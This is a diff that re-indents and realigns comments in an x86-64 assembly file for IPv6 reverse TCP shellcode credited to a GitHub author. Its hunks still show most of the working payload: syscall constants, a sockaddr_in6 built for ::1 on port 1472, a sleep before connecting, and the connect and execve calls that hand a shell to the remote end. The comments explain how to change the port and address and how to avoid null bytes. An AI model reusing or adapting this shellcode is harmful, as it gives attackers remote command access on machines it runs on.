@@ -1,7 +1,7 @@
 [BITS 64]
 
-;	**reverse ip6 tcp shell	
-;	* size >= 111 bytes (depends of ip addr, default is ::1)
+; **reverse ip6 tcp shell	
+; * size >= 111 bytes (depends of ip addr, default is ::1)
 ; * nullbytes free (depends only on ip addr,
 ;   you could always and the ip add to remove
 ;   the nulls like i did with the port)
@@ -23,12 +23,12 @@
 ; made by srakai (github.com/Srakai)
 
 
-AF_INET6 	  equ 10
-SOCK_STREAM equ 1
-SOCKET 		  equ 41
-CONNECT 	  equ 42
-DUP2 		    equ 33
-EXECVE 		  equ 59
+AF_INET6 	equ 10
+SOCK_STREAM	equ 1
+SOCKET 		equ 41
+CONNECT 	equ 42
+DUP2 		equ 33
+EXECVE 		equ 59
 NANOSLEEP 	equ 35
 
 section .text
@@ -52,13 +52,13 @@ push 	rax
 pop 	rbx
 
 ; create struct sockaddr_in6
-push  rdx			  			        ;scope id = 0
+push	rdx			;scope id = 0
 mov 	rcx, 0x0100000000000000 ;sin6_addr 	for local link use:
 push 	rcx                     ;sin6_addr 	0x0100000000000000 
 mov 	rcx, 0x0000000000000000 ;sin6_addr 	0x0000000000000000
-push 	rcx 					          ;sin6_addr
-mov 	edx, 0xc005FFFF 		    ;sin6_flowinfo=0 , family=AF_INET6, port=1472 
-and 	dx, di 					        ;to change port change P, 0xPPPP000A
+push 	rcx 			;sin6_addr
+mov 	edx, 0xc005FFFF 	;sin6_flowinfo=0 , family=AF_INET6, port=1472 
+and 	dx, di 			;to change port change P, 0xPPPP000A
 push 	rdx
 
 sleep:
@@ -66,7 +66,7 @@ sleep:
 xor 	rsi, rsi
 ; struct timespec
 push 	rsi 		;push 0
-push 	3 			;seconds to sleep
+push 	3 		;seconds to sleep
 
 ; nanosleep()
 push 	rsp
@@ -83,7 +83,7 @@ push 	rbx
 pop 	rdi
 push 	rsp
 pop 	rsi
-push 	28 			;sizeof struct
+push 	28 		;sizeof struct
 pop 	rdx
 push 	CONNECT
 pop 	rax
@@ -113,4 +113,3 @@ pop 	rdi
 push 	EXECVE 
 pop 	rax
 syscall
-
